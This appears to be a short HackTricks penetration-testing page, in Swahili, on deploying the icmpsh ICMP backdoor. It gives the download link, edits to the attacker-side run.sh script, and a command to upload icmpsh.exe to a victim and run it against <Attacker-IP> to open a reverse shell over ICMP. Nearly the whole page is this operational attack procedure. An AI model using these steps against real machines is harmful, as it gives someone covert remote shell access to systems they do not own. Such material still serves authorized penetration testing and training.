{{#include ../banners/hacktricks-training.md}}

Pakua backdoor kutoka: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Upande wa mteja

Tekeleza script: **run.sh**

**Ikiwa unapata makosa, jaribu kubadilisha mistari:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Kwa:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Upande wa Mwathirika**

Pakia **icmpsh.exe** kwa mwathirika na uendeshe:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
